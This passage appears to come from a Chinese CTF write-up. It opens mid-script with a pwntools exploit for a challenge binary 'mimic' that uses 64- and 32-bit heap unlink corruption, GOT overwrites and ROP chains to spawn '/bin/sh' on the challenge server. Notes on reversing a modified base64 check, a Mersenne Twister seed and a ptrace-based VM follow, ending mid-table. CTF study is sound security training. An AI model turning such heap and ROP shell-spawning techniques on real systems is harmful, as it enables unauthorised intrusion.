            #p = process('./mimic')
            #p = remote('127.0.0.1', 9999)
            p = process('./mimic')
        else:
            p = remote('45.32.120.212', 6666)
        if DEBUG == 1:
            #pass
            gdb.attach(p)
        # 64 bit unlink
        add(p, 0x100-8) # 0
        add(p, 0x100-8) # 1
        add(p, 0x100-8) # 2
        add(p, 0x100-8) # 3
        delete(p, 0)
        payload = 'a' * (0xf0) + p64(0x200)
        edit(p, 1, payload)
        delete(p, 2)
        add(p, 0x1f8) # 0 is 1
        add(p, 0xf8)  # 2
        payload = p64(0) + p64(0xf1) + p64(0x6020b0-0x18) + p64(0x6020b0-0x10)
        payload = payload.ljust(0xf0, '\x00') + p64(0xf0)
        edit(p, 1, payload)
        delete(p, 2)
        # 32 bit unlink
        add(p, 0x100-8)
        add(p, 0x100-8)
        add(p, 0x100-4) # 32 bit 5/6/7
        add(p, 0x100-4)
        add(p, 0x100-4)
        add(p, 0x100-4)
        delete(p, 5)
        payload = 'a' * 0xf8 + p32(0x200)
        edit(p, 6, payload)
        delete(p, 7)
        add(p, 0x1f8+4) # 5 is 6
        add(p, 0xf8+4)  # 7
        payload = p32(0) + p32(0xf9) + p32(0x804a090-0x18/2) + p32(0x804a090-0x10/2)
        payload = payload.ljust(0xf8, '\x00') + p32(0xf8)
        edit(p, 6, payload)
        delete(p, 7)
        # 64 idx 1 /// 32 idx 6
        payload = p64(0) + p64(0x602050) + p64(0x20) + p64(0x602818) + p64(0x1000) + p64(0x602200) + p64(0x1000)[:5]
        edit(p, 1, payload)   #0x602058
        payload = p32(0xf8) + p32(0x804a060) + p32(0x100) + p32(0x804a060) + p32(0x1000)[:3]
        edit(p, 6, payload)
        payload = p32(elf32.got['atoi']) + p32(0x20) + p32(0x804a200) + p32(0x1000) + p32(0x804a7fc) + p32(0x1000) + p32(0x0804a018) + p32(4)
        edit(p, 6, payload)
        edit(p, 3, p32(0x080489fb)) # test
        ############### 64 bit ROP
        # call read to change write@got to syscall
        ROP64 = p64(0x400c2a) + p64(0) + p64(1) + p64(elf64.got['read']) + p64(1) + p64(elf64.got['write']) + p64(0) + p64(0x400C10)
        ROP64 += p64(0) * 2 + p64(0x602700) + p64(0) * 4
        ROP64 += p64(0x400c2a) + p64(0) + p64(1) + p64(elf64.got['read']) + p64(1) + p64(0x602200) + p64(0) + p64(0x400C10)
        ROP64 += p64(0) * 2 + p64(59+0x30) + p64(0) * 3 + '/bin/sh\x00'# 0x602900 binsh
        # set rax
        ROP64 += p64(0x400B2B) + p64(0) + p64(0)
        # call syscall
        ROP64 += p64(0x400c2a) + p64(0) + p64(1) + p64(elf64.got['write']) + p64(0) + p64(0) + p64(0x602900) + p64(0x400C10)
        ROP64 += p64(0) * 2 + p64(0x602700) + p64(0) * 4 + p64(0xdeadbeef) 
        edit(p, 1, ROP64)
        ############### 64 bit ROP
        ############### 32 bit ROP
        read_plt = 0x8048460
        write_got = 0x804A02C
        write_plt = 0x80484D0
        p_4reg_32 = 0x080489f8
        p_ebx_32 = 0x08048439
        bin_sh_addr = 0x804a2e8
        # call read to change write@got to syscall
        ROP32 = p32(read_plt)+p32(p_4reg_32)+p32(0)+p32(0x804a300)+p32(1)+p32(0)
        ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(0)+p32(write_got)+p32(1)+p32(0)
        ROP32 += p32(read_plt)+p32(p_4reg_32)+p32(0)+p32(0)+p32(0)+p32(0)
        # set eax, edx
        ROP32 += p32(0x080489f9) + p32(0) + p32(0) + p32(0xb+0x2c)
        ROP32 += p32(0x8048907)
        ROP32 += p32(0) * 9
        ROP32 += p32(0x8048588)
        # set ebx and call syscall
        ROP32 += p32(p_ebx_32)+p32(bin_sh_addr)+p32(write_plt)
        edit(p, 2, ROP32)
        ############### 32 bit ROP
        # trigger ROP
        payload = p32(0x80489ee) + p32(0) + p64(0x400c2f)[:6]
        edit(p, 0, payload)
        #raw_input()
        payload = p32(0x602800) + p32(0) + p32(0x804a800-8) + p32(0x8048568) + p64(0x400c2d) + p64(0x602800)[:6]
        p.sendafter('>> ', payload)
        ##### first read to change write@got in 64bit
        p.send('\x7b')
        ##### second read to change write@got in 32bit
        p.send(chr(count))
        p.interactive()
        p.close()
    if __name__ == '__main__':
            pwn(108) # Bruteforce 32 bit libc
## Reverse
### Re_sign
upx壳  
对用户输入进行魔改后的base64加密，然后再与标准base64编码表下标组成的特定数组进行对比。
### Cplusplus
C++的逆向，输入首先被分为三段，每段都是纯数字，格式是12@345#678。之后分别对三段进行验证。第一段实现了Mersenne
twister这个伪随机数算法，用户的输入是随机种子，不过会检查用户的输入小于0X6F，这个量级太小了，用x64dbg动态调，然后手动输入就爆破出来了，比较幸运我是从后往前爆破的。  
之后第二段直接验证了输入的每一位，比较简单。第三段是由第一段生成的，也很简单。最后就得到了答案。
### signal vm
main函数首先fork了一下，子进程首先ptarce_traceme，之后执行一大段非法指令，父进程调用ptrace，对子进程进行trace。  
每次子进程出现异常时，父进程都会监控到，拿到子进程的寄存器值和当前执行指令，根据指令进行一系列操作。如同题目一样，实现了基于signal的虚拟机，父进程实际执行子进程的代码。  
之后就是逆向分析了，先分析opcode，之后反汇编，反编译，最后看懂代码的含义，逆向。关键的代码对用户输入和7*10的矩阵做乘法，最后和目标矩阵对比。解一个矩阵方程就得到了flag。  
opcode手工反编译
    opcode                  stat            asm                         comment
    06 01 06 00 00 00 00    4               mov  reg_6, num(0)
    06 01 03 00 00 00 00    4               mov  reg_3, num(0)
    00 00 00 0F             b               jmp  num(0F)                ;jump L0
    00 00 00 
    CC
    L1: check input size
    00 01 03 01 00 00 00    5               add  reg_3, 1
    L0:
    06 00 00 03             4               mov  reg_0, reg_3
    06 00 02 00             4               mov  reg_2, reg_0
    06 01 00 32 00 00 00    4               mov  reg_0, num(32)
    CC
    00 00 00 02             5               add  reg_0, reg_2
    06 02 00 00             4               load reg_0, mem:reg_0       ;input[0]
    30 C0
    F6 F8 01 00 00 00 00 00 8               cmp  reg_0, num(0)
    00 00 02 D6 FF FF FF    b               jne   num(d6)               ;jump L1
    30 C0 
    F6 F8 01 03 46 00 00 00 8               cmp  reg_3, num(0x46)       ;len 
    00 00 01 15 00 00 00    b               jeq  num(0x15)              ;jump L2
    06 01 00 00 00 00 00    4               mov  reg_0, 0
    00 00 00 E1 01 00 00    b               jmp num (0x01E1)            ;ret(0)
    ;-------------------------------------------------------------------------------    L2:
    06 01 03 00 00 00 00    4               mov  reg_3, num(0)          ;i = 0
    00 00 00 40 01 00 00    b               jmp  num(0x0140)            ;jump L8
    L3:
    06 01 04 00 00 00 00    4               mov  reg_4, num(0)          ;j = 0
    00 00 00 11 01 00 00    b               jmp  num(0x0111)            ;jump L4
    L5:
    06 01 06 00 00 00 00    4               mov  reg_6, num(0)          ;res = 0
    06 01 05 00 00 00 00    4               mov  reg_5, num(0)          ;k = 0
    00 00 00 A1 00 00 00    b               jump  num(0xA1)             ;jump L6
    L7:
    06 00 02 03             4               mov  reg_2, reg_3           ;tmp_1 = i
    06 00 00 02             4               mov  reg_0, reg_2
    CC 
    08 01 00 03 00 00 00    5               LS   reg_0, 3
    CC 
    01 00 00 02             5               sub  reg_0, reg_2
    06 00 02 00             4               mov  reg_2, reg_0           ;tmp_1 = 7*i
    06 00 00 05             4               mov  reg_0, reg_5
    CC
    00 00 00 02             5               add  reg_0, reg_2           ;
    06 00 02 00             4               mov  reg_2, reg_0           ;tmp_1 += k 
    06 01 00 32 00 00 00    4               mov  reg_0, num(0x32)       ;offset
    CC
    00 00 00 02             5               add  reg_0, reg_2           ;tmp_1 += 50; tmp_1 = 7*i + k + 50
    06 02 01 00             4               load reg_1, mem:reg_0       ;tmp_1 = input[7*i + k]         
    06 00 02 05             4               mov  reg_2, reg_5
    06 00 00 02             4               mov  reg_0, reg_2
    CC 
    08 01 00 03 00 00 00    5               LS   reg_0, 3               ;
    CC 
    01 00 00 02             5               sub  reg_0, reg_2           ;tmp_2 = 7*k
    06 00 02 00             4               mov  reg_2, reg_0           
    06 00 00 04             4               mov  reg_0, reg_4
    CC 
    00 00 00 02             5               add  reg_0, reg_2           ;tmp_2 += j
    06 00 02 00             4               mov  reg_2, reg_0           
    06 01 00 00 00 00 00    4               mov  reg_0, 0
    CC 
    00 00 00 02             5               add  reg_0, reg_2           ;
    06 02 02 00             4               load reg_2, mem:[reg_0]     ;chr = mem[tmp_2] = mem[(7*k + j) ]
    06 00 00 01             4               mov  reg_0, reg_1           
    CC 
    02 00 00 02             5               mult reg_0, reg_2           ;tmp_3 = chr * tmp_1
    CC 
    04 01 00 00 01 00 00    5               mod  reg_0, num(0x100)      ;tmp_3 %= 0x100
    CC
    00 00 06 00             5               add  reg_6, reg_0           ;res += tmp3
    CC 
    04 01 06 00 01 00 00    5               mod  reg_6, num(0x100)      ;res %= 0x100
    06 00 00 05             4               mov  reg_0, reg_5
    CC 
    00 01 00 01 00 00 00    5               add  reg_0, 1
    06 00 05 00             4               mov  reg_5, reg_0           ;k += 1
    30 C0
    L6:
    F6 F8 01 05 06 00 00 00 8               cmp reg_5, num(6)
    00 00 06 5C FF FF FF    b               jle num(0XFF5C)             ;jump L7
    06 00 02 03             4               mov  reg_2, reg_3 
    06 00 00 02             4               mov  reg_0, reg_2
    CC 
    08 01 00 03 00 00 00    5               LS   reg_0, 3               ;
    CC 
    01 00 00 02             5               sub  reg_0, reg_2           ;tmp_1 = 7 * i
    06 00 02 00             4               mov  reg_2, reg_0
    06 00 00 04             4               mov  reg_0, reg_4
    CC 
    00 00 00 02             5               add  reg_0, reg_2           ;tmp_1 += j
    06 00 02 00             4               mov  reg_2, reg_0
    06 01 00 96 00 00 00    4               mov  reg_0, num(0x96)
    CC 
    00 00 00 02             5               add  reg_0, reg_2           ;tmp_1 += 0x96
    06 00 01 06             4               mov  reg_1, reg_6
    06 20 00 01             4               sto  MEM:[reg_0], reg_1     ;mem[tmp_1] = res
    06 00 00 04             5               mov  reg_0, reg_4
    CC 
    00 01 00 01 00 00 00    5               add  reg_0, 1
    06 00 04 00             4               mov  reg_4, reg_0           ;j += 1
    L4:
    F6 F8 01 04 06 00 00 00 b               cmp reg_4, num(6)
    00 00 06 EC FE FF FF    8               jle num(0XFFEC)             ;jump L5
    06 00 00 03             4               mov reg_0, reg_3            ;i += 1
    00 01 00 01 00 00 00    5               add reg_0, 1                
    06 00 03 00             4               mov reg_3, reg__0
    L8:
    F6 F8 01 03 09 00 00 00 8               cmp reg_3, num(9)
    00 00 06 BD FE FF FF    b               jle num(0xFFBD)             ;jump L3
    ;--------------------------------------------------------------------------------    
    L10:
    06 01 03 00 00 00 00    4               mov  reg_3, 0               ;i = 0
    00 00 00 63 00 00 00    8               jmp  num(0x63)              ;jump L9
    06 00 00 03             4               mov  reg_0, reg_3
    06 00 02 00             4               mov  reg_2, reg_0
    06 01 00 96 00 00 00    4               mov  reg_0, num(0x96)
    CC 
    00 00 00 02             5               add  reg_0, reg_2           ;tmp = i + 0x96
    06 02 01 00             4               mov  reg_1, reg_0